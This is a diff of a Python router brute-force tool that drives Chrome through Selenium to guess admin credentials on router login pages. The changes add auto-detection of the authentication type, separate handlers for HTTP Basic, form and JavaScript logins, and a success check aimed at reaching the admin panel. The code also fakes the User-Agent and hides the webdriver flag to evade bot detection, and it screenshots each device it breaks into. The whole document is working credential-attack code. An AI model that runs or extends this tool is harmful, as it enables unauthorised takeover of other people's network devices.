@@ -166,8 +166,25 @@ class ChromeRouterBruteForce:
             # Random User-Agent
             chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
             
-            # Create driver
-            driver = webdriver.Chrome(options=chrome_options)
+            # Try to create driver with auto-detection
+            try:
+                driver = webdriver.Chrome(options=chrome_options)
+            except Exception as e:
+                if "version" in str(e).lower() or "compatible" in str(e).lower():
+                    print(f"{Colors.YELLOW}[!] ChromeDriver version mismatch detected. Attempting to download compatible version...{Colors.END}")
+                    # Try to download compatible ChromeDriver
+                    try:
+                        import auto_chromedriver
+                        if auto_chromedriver.main():
+                            print(f"{Colors.GREEN}[+] Compatible ChromeDriver downloaded. Retrying...{Colors.END}")
+                            driver = webdriver.Chrome(options=chrome_options)
+                        else:
+                            raise Exception("Failed to download compatible ChromeDriver")
+                    except ImportError:
+                        print(f"{Colors.RED}[!] Auto ChromeDriver downloader not available. Please run: python auto_chromedriver.py{Colors.END}")
+                        raise e
+                else:
+                    raise e
             
             # Execute script to remove webdriver property
             driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
@@ -268,8 +285,179 @@ class ChromeRouterBruteForce:
             print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
             return None
     
+    def detect_authentication_type(self, driver, url):
+        """Detect authentication type using Chrome"""
+        try:
+            page_source = driver.page_source.lower()
+            current_url = driver.current_url.lower()
+            
+            # 1. HTTP Basic Authentication
+            if 'www-authenticate' in str(driver.get_log('browser')).lower():
+                return 'http_basic'
+            
+            # 2. Form-based Authentication (most common)
+            if '<form' in page_source and ('password' in page_source or 'passwd' in page_source):
+                return 'form_based'
+            
+            # 3. JavaScript-based Authentication
+            if 'javascript' in page_source and ('login' in page_source or 'auth' in page_source):
+                return 'javascript_based'
+            
+            # 4. API-based Authentication
+            if any(keyword in page_source for keyword in ['api', 'json', 'ajax', 'xmlhttprequest']):
+                return 'api_based'
+            
+            # 5. Cookie-based Authentication
+            if any(keyword in page_source for keyword in ['cookie', 'session', 'token', 'csrf']):
+                return 'cookie_based'
+            
+            # 6. Redirect-based Authentication
+            if driver.execute_script("return window.location.href") != url:
+                return 'redirect_based'
+            
+            # Default to form-based
+            return 'form_based'
+            
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!] Error detecting auth type: {e}{Colors.END}")
+            return 'form_based'
+    
+    def handle_http_basic_auth(self, driver, url, username, password):
+        """Handle HTTP Basic Authentication"""
+        try:
+            # For HTTP Basic Auth, we need to include credentials in URL
+            from urllib.parse import urlparse
+            parsed_url = urlparse(url)
+            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
+            driver.get(auth_url)
+            time.sleep(3)
+            return True, driver.current_url
+        except Exception as e:
+            print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed: {e}{Colors.END}")
+            return False, None
+    
+    def handle_form_based_auth(self, driver, username, password):
+        """Handle form-based authentication"""
+        try:
+            # Detect login form
+            username_field, password_field = self.detect_login_form(driver)
+            
+            if not username_field or not password_field:
+                return False, None
+            
+            # Fill login form
+            username_field.clear()
+            username_field.send_keys(username)
+            time.sleep(0.5)
+            
+            password_field.clear()
+            password_field.send_keys(password)
+            time.sleep(0.5)
+            
+            # Find and click submit button
+            submit_button = self.find_submit_button(driver)
+            if submit_button:
+                submit_button.click()
+            else:
+                # Try pressing Enter on password field
+                password_field.send_keys("\n")
+            
+            # Wait for page to load after login
+            time.sleep(5)
+            
+            return True, driver.current_url
+            
+        except Exception as e:
+            print(f"{Colors.YELLOW}[-] Form-based auth failed: {e}{Colors.END}")
+            return False, None
+    
+    def handle_javascript_auth(self, driver, username, password):
+        """Handle JavaScript-based authentication"""
+        try:
+            # Try to execute JavaScript for login
+            script = f"""
+            var usernameField = document.querySelector('input[name="username"], input[name="user"], input[name="login"], input[type="text"]');
+            var passwordField = document.querySelector('input[name="password"], input[name="pass"], input[name="passwd"], input[type="password"]');
+            
+            if (usernameField && passwordField) {{
+                usernameField.value = '{username}';
+                passwordField.value = '{password}';
+                
+                // Try to find and click submit button
+                var submitButton = document.querySelector('input[type="submit"], button[type="submit"], button:contains("Login"), button:contains("Sign In")');
+                if (submitButton) {{
+                    submitButton.click();
+                }} else {{
+                    // Try form submit
+                    var form = usernameField.closest('form');
+                    if (form) {{
+                        form.submit();
+                    }}
+                }}
+                return true;
+            }}
+            return false;
+            """
+            
+            result = driver.execute_script(script)
+            if result:
+                time.sleep(5)
+                return True, driver.current_url
+            else:
+                return False, None
+                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[-] JavaScript auth failed: {e}{Colors.END}")
+            return False, None
+    
+    def is_login_successful(self, driver, initial_url, initial_title):
+        """Check if login was successful"""
+        try:
+            current_url = driver.current_url
+            current_title = driver.title
+            page_source = driver.page_source.lower()
+            
+            # Check for success indicators
+            success_indicators = [
+                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
+                'system', 'status', 'network', 'router', 'gateway', 'modem',
+                'welcome', 'main menu', 'logout', 'log out', 'management',
+                'device status', 'system information', 'firmware', 'wan', 'lan'
+            ]
+            
+            # Check for failure indicators
+            failure_indicators = [
+                'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong',
+                'login failed', 'authentication failed', 'access denied',
+                'username', 'password', 'enter credentials', 'sign in',
+                'login', 'authentication', 'please login'
+            ]
+            
+            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
+            failure_count = sum(1 for indicator in failure_indicators if indicator in page_source)
+            
+            # Check if URL changed (good sign)
+            url_changed = current_url != initial_url
+            
+            # Check if we're still on login page
+            still_on_login = any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth', 'authentication'])
+            
+            # Check for admin panel specific indicators
+            admin_indicators = ['admin panel', 'router management', 'device management', 'network management']
+            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
+            
+            # Determine if login was successful
+            if (success_count > failure_count and success_count >= 2) or (url_changed and not still_on_login) or admin_count >= 1:
+                return True, current_url
+            else:
+                return False, None
+                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[-] Error checking login success: {e}{Colors.END}")
+            return False, None
+
     def test_credentials_with_chrome(self, url, username, password):
-        """Test credentials using Chrome automation"""
+        """Test credentials using Chrome automation with multiple auth types"""
         driver = None
         try:
             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
@@ -287,70 +475,33 @@ class ChromeRouterBruteForce:
             initial_url = driver.current_url
             initial_title = driver.title
             
-            # Detect login form
-            username_field, password_field = self.detect_login_form(driver)
+            # Detect authentication type
+            auth_type = self.detect_authentication_type(driver, url)
+            print(f"{Colors.BLUE}[*] Detected auth type: {auth_type}{Colors.END}")
             
-            if not username_field or not password_field:
-                print(f"{Colors.YELLOW}[-] No login form found{Colors.END}")
-                return False, None, None
+            # Handle different authentication types
+            success = False
+            final_url = None
             
-            # Fill login form
-            try:
-                username_field.clear()
-                username_field.send_keys(username)
-                time.sleep(0.5)
-                
-                password_field.clear()
-                password_field.send_keys(password)
-                time.sleep(0.5)
-                
-                # Find and click submit button
-                submit_button = self.find_submit_button(driver)
-                if submit_button:
-                    submit_button.click()
+            if auth_type == 'http_basic':
+                success, final_url = self.handle_http_basic_auth(driver, url, username, password)
+            elif auth_type == 'form_based':
+                success, final_url = self.handle_form_based_auth(driver, username, password)
+            elif auth_type == 'javascript_based':
+                success, final_url = self.handle_javascript_auth(driver, username, password)
+            else:
+                # Try form-based as fallback
+                success, final_url = self.handle_form_based_auth(driver, username, password)
+            
+            if success:
+                # Check if login was actually successful
+                login_success, admin_url = self.is_login_successful(driver, initial_url, initial_title)
+                if login_success:
+                    print(f"{Colors.GREEN}[+] Login successful!{Colors.END}")
+                    return True, admin_url, driver
                 else:
-                    # Try pressing Enter on password field
-                    password_field.send_keys("\n")
-                
-                # Wait for page to load after login
-                time.sleep(5)
-                
-            except Exception as e:
-                print(f"{Colors.YELLOW}[-] Error filling form: {e}{Colors.END}")
-                return False, None, None
-            
-            # Check if login was successful
-            current_url = driver.current_url
-            current_title = driver.title
-            page_source = driver.page_source.lower()
-            
-            # Check for success indicators
-            success_indicators = [
-                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
-                'system', 'status', 'network', 'router', 'gateway', 'modem',
-                'welcome', 'main menu', 'logout', 'log out'
-            ]
-            
-            # Check for failure indicators
-            failure_indicators = [
-                'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong',
-                'login failed', 'authentication failed', 'access denied',
-                'username', 'password', 'enter credentials', 'sign in'
-            ]
-            
-            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
-            failure_count = sum(1 for indicator in failure_indicators if indicator in page_source)
-            
-            # Check if URL changed (good sign)
-            url_changed = current_url != initial_url
-            
-            # Check if we're still on login page
-            still_on_login = any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth', 'authentication'])
-            
-            # Determine if login was successful
-            if (success_count > failure_count and success_count >= 2) or (url_changed and not still_on_login):
-                print(f"{Colors.GREEN}[+] Login successful!{Colors.END}")
-                return True, current_url, driver
+                    print(f"{Colors.YELLOW}[-] Login failed - not in admin panel{Colors.END}")
+                    return False, None, None
             else:
                 print(f"{Colors.YELLOW}[-] Login failed{Colors.END}")
                 return False, None, None
@@ -359,7 +510,7 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error testing credentials: {e}{Colors.END}")
             return False, None, None
         finally:
-            if driver:
+            if driver and not success:
                 driver.quit()
     
     def take_screenshot(self, driver, url, username, password, ip_address):
